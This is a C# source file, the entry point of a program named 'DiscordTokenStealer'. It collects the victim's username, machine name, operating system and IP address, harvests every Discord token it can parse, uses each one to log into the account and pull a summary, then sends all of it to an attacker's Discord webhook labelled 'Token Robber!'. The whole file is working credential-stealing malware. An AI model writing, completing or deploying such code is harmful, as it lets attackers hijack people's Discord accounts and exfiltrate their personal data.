using System.Text;
using DiscordTokenStealer.Discord;

namespace DiscordTokenStealer;

public static class Program
{
    private static async Task Main()
    {
        StringBuilder content = new StringBuilder()
            .AppendLine($"Username: {Environment.UserName}")
            .AppendLine($"Machine Name: {Environment.MachineName}")
            .AppendLine($"Operating System: {Environment.OSVersion.Platform}")
            .AppendLine($"IP-Adress: {await IPInfo.GetAddress()}")
            .AppendLine("Tokens: ");
        await Parallel.ForEachAsync(TokenParser.ParseAll(), async (token, cts) =>
        {
            using DiscordClient client = new DiscordClient(token);
            string? summary = await client.GetSummary(cts);
            lock (content)
            {
                content.Append(summary);
            }
        });
        using DiscordWebhook webhook = new DiscordWebhook("webhook_id", "webhook_token");
        await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
    }
}